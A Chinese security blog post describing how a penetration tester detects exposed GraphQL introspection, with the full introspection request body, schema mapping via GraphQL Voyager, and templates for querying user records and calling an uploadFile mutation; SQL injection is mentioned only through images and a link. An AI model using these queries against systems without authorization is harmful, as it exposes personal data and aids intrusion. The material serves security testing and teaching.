#  Graphql内审查询漏洞分析   
原创 Hacker  0xh4ck3r   2025-01-18 06:32  
  
### 什么是graphql？  
  
GraphQL  
 是一个用于 API的查询语言，使用基于类型系统来执行查询的服务（类型系统由你的数据定义）。GraphQL  
 并没有和任何特定数据库或者存储引擎绑定，而是依靠你现有的代码和数据支撑。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRY0srnG8aC4xbibhnJtwbtUx4l9wJ6kPaS9LzmfI5s54YytYSpophvlUTA1HaaO6iapPdHY65Ebznw/640?wx_fmt=png&from=appmsg "")  
  
image-20230213232716537  
### 漏洞挖掘  
  
在网站与数据库的数据交互过程中，按常理都是mysql、oracle、mssql交互，但是在渗透测试中遇到了graphql数据库，其实跟日常数据库也很像，可以理解为API语句查询数据，这里提一下内审查询是什么，简单来说就是，GraphQL  
内置了接口文档，你可以通过内省的方法获得这些信息，如对象定义、接口参数等信息。  
  
当使用者不知道某个GraphQL  
接口中的类型哪些是可用的，可以通过__schema  
字段来向GraphQL  
查询哪些类型是可用的。  
  
当然在其它网站的渗透中也遇到了修补这个查询的情况，就是可以在配置文件中禁用即可，但是粗心大意的开发者还是不太关注这个问题，就导致了内审查询，通过内审查询，我们可以得到它的数据库划分情况，可以构建graphql语句去查询，同理也可以挖掘sql注入，这个后面会提。  
  
判断是否存在内审查询用以下方法即可：  
  
首先确定数据交互使用的是graphql，在登录或者其它数据交互处抓包即可看到类似：http://target.com/graphql ，以此可以判断是使用了graphql作数据交互的，然后我们只需要修改请求体即可**（有些网站会有鉴权，这个可能会导致后面渗透过程中查询用户信息没法越权，比较恶心，此处渗透测试的目标就是有鉴权， ~_~ ）**  
，如下：  
```
{"query":"{\r\n  __schema {\r\n    types {\r\n      name\r\n    }\r\n  }\r\n}\r\n","variables":null}

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRY0srnG8aC4xbibhnJtwbtUGfg3DDKuK8KeEdvR6bObqJHBTo6gCQNQDhAsUiaq9pXBibfmgaPbK8ug/640?wx_fmt=png&from=appmsg "")  
  
image-20230213234030424  
  
如果出现如上图所示，查询成功的话，就说明存在内审查询，继续往下查询：  
```
{"query":"\n    query IntrospectionQuery {\r\n      __schema {\r\n        queryType { name }\r\n        mutationType { name }\r\n        subscriptionType { name }\r\n        types {\r\n          ...FullType\r\n        }\r\n        directives {\r\n          name\r\n          description\r\n          locations\r\n          args {\r\n            ...InputValue\r\n          }\r\n        }\r\n      }\r\n    }\r\n\r\n    fragment FullType on __Type {\r\n      kind\r\n      name\r\n      description\r\n      fields(includeDeprecated: true) {\r\n        name\r\n        description\r\n        args {\r\n          ...InputValue\r\n        }\r\n        type {\r\n          ...TypeRef\r\n        }\r\n        isDeprecated\r\n        deprecationReason\r\n      }\r\n      inputFields {\r\n        ...InputValue\r\n      }\r\n      interfaces {\r\n        ...TypeRef\r\n      }\r\n      enumValues(includeDeprecated: true) {\r\n        name\r\n        description\r\n        isDeprecated\r\n        deprecationReason\r\n      }\r\n      possibleTypes {\r\n        ...TypeRef\r\n      }\r\n    }\r\n\r\n    fragment InputValue on __InputValue {\r\n      name\r\n      description\r\n      type { ...TypeRef }\r\n      defaultValue\r\n    }\r\n\r\n    fragment TypeRef on __Type {\r\n      kind\r\n      name\r\n      ofType {\r\n        kind\r\n        name\r\n        ofType {\r\n          kind\r\n          name\r\n          ofType {\r\n            kind\r\n            name\r\n            ofType {\r\n              kind\r\n              name\r\n              ofType {\r\n                kind\r\n                name\r\n                ofType {\r\n                  kind\r\n                  name\r\n                  ofType {\r\n                    kind\r\n                    name\r\n                  }\r\n                }\r\n              }\r\n            }\r\n          }\r\n        }\r\n      }\r\n    }\r\n  ","variables":null}

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRY0srnG8aC4xbibhnJtwbtUg91rJ6DqGGfywSMKxuaNJhccnaA3OpDVDX5t2icLKLlicX3esmE6JLicw/640?wx_fmt=png&from=appmsg "")  
  
image-20230213234112187  
  
然后我们复制上图返回结果中的响应体去下方网站内获取数据库结构：  
  
GraphQL Voyager (ivangoncharov.github.io)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRY0srnG8aC4xbibhnJtwbtUhJSTWdYHA4Ll4dPycIN0554hSiapePgWGRSfM3HbT2ia0wic0gnXMGiaHQ/640?wx_fmt=png&from=appmsg "")  
  
image-20230213234303754  
  
然后点击display即可得到数据库结构，接下来我们根据数据库结构去构造查询语法或者修改语法即可  
  
这里为了方便之后做测试，归类一下：（其中test为库名或者说是类名，因为其 表方法跟常见数据库还是有些差别的）  
  
查询语法格式：  
```
{"query":"{\n          test(id:2){\n    name\n    id\n    telephone\n  }\n        }"}

```  
  
修改语法格式：  
```
{"query":"mutation test($arg1:String!,$arg2:String!){\n  \t\tuploadFile(\n        input:{\n          arg1:$arg1,\n          arg2:$arg2\n        }\n        )}","variables":{"arg1":"xxxx","arg2":"xxxx"},"operationName":"test"}

```  
### sql注入  
  
这里引用大佬的图，非常简单明了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRY0srnG8aC4xbibhnJtwbtUQhlNUhBdicCCBibsW9yytEPdvjnwMibSSYqTScsvicAkpjJkic3NdouwxBg/640?wx_fmt=png&from=appmsg "")  
  
image-20230213235821923  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRY0srnG8aC4xbibhnJtwbtUqiaZ0ct13aOXPQkoK7pa26zjcxrIiaNpYdr9ldpSxfejJR1321Xecfvw/640?wx_fmt=png&from=appmsg "")  
  
image-20230213235836269  
  
后面还有一些利用点和漏洞点，可以查看大佬文章：  
渗透测试之graphQL_Sp4rkW的博客-CSDN博客_graphql漏洞  
  
  
